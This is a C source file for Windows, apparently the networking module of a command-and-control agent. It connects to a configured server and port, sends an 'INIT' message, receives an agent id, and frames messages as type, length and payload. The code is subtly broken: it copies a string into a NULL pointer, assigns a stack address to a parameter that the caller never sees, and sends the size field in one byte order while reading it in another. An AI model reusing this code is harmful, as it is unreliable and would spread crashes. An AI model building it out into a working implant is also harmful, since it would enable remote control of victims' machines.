#pragma comment(lib, "Ws2_32.lib")
#include <winsock2.h>
#include <ws2tcpip.h>
#include <time.h>
#include <stdio.h>
#include "socketManager.h"

MESSAGE INIT_MESSAGE = {
    .payload = (PBYTE)"INIT",
    .size = sizeof("INIT"),
    .type = 0x0A        
}; 


void createSocketManager(PSOCKET_MANAGER pSockManager)
{
    WSADATA wsaData = {0};
    int sStartUp = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (sStartUp != 0)
    {
        printf("[-] Socket initialization failed -> %i\n", sStartUp);
        return;
    }

    SOCKET sock = INVALID_SOCKET;
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        printf("[-] Socket creation failed -> 0x%i\n", WSAGetLastError());
        return;
    }

    struct sockaddr_in sockAddr =
    {
        .sin_family = AF_INET, 
        .sin_port = htons(PORT)
    };

    if (inet_pton(AF_INET, SERVER, &sockAddr.sin_addr) != 1)
    {
        printf("[-] inet_pton failed -> %i\n", WSAGetLastError());
        return;
    };

    if (connect(sock, (struct sockaddr *)&sockAddr, sizeof(sockAddr)) != 0)
    {
        printf("[-] connect failed -> %i\n", WSAGetLastError());
        return;
    };

    printf("[+] Socket successfully intialized...\n");
    PSTR auxServerName = NULL;
    strcpy_s(auxServerName,strlen(SERVER),SERVER);
    SOCKET_MANAGER sManager = {
        .port = PORT,
        .server = auxServerName,
        .s = sock
    };

    pSockManager = &sManager;
    sendMessage(pSockManager, &INIT_MESSAGE);
    MESSAGE message = {0};
    receiveMessage(pSockManager, &message);
    DWORD agentId = (message.payload[0] << 24) | (message.payload[1] << 16) | (message.payload[2] << 8) | (message.payload[3]);
    printf("My agent id is -> %u", agentId);
}

BOOL sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
{
    /*Initialize size variables*/
    DWORD size = message->size;
    DWORD sizeToAlloc = size + sizeof(DWORD) + 1; /* SIZE to alloc is -> size of the payload + size of a DWORD + SIZE of a char */
    /*
    Initialize buffer to send the whole message
    ------------------------------------------
     ------    -------    ------------------- 
    | TYPE |  | PSIZE |  |      PAYLOAD      |
     ------    -------    -------------------
     1 Byte    4 Bytes        PSIZE Bytes
    ------------------------------------------
                  SIZE_TO_ALLOC
    */
    char* data = (char*)VirtualAlloc(NULL, sizeToAlloc, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

    if (data == NULL)
    {
        printf("[-] VirtualAlloc failed %li", GetLastError());
        return FALSE;
    }
    
    data[0] = message->type;
    memcpy((data + 1), &size, sizeof(DWORD));
    memcpy((data + 1 + sizeof(DWORD)), message->payload, size);

    send(sManager->s, data, sizeToAlloc, 0);
    return TRUE;
}

void receiveMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
{   
    /* READING ONE BYTE FOR MESSAGE TYPE */
    char responseType = 0x0;
    if (recv(sManager->s, &responseType, sizeof(char), 0) == SOCKET_ERROR)
    {
        printf("[-] recv failed -> %i\n", WSAGetLastError());
        return;
    };
    
    /* READING PSIZE_FIELD_SIZE BYTES FOR MESSAGE PAYLOAD SIZE FIELD */
    char size[4];
    if (recv(sManager->s, size, PSIZE_FIELD_SIZE, 0) == SOCKET_ERROR)
    {
        printf("[-] recv failed -> %i\n", WSAGetLastError());
        return;
    };

    /* READING payloadSize BYTES FOR MESSAGE PAYLOAD */
    DWORD payloadSize = (size[0] << 24) | (size[1] << 16) | (size[2] << 8) | (size[3]);
    char* buffer = (char*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (recv(sManager->s, buffer, payloadSize, 0) == SOCKET_ERROR)
    {
        printf("[-] recv failed -> %i\n", WSAGetLastError());
        return;
    };

    message->payload = (PBYTE)buffer;
    message->size = payloadSize;
    message->type = responseType;
}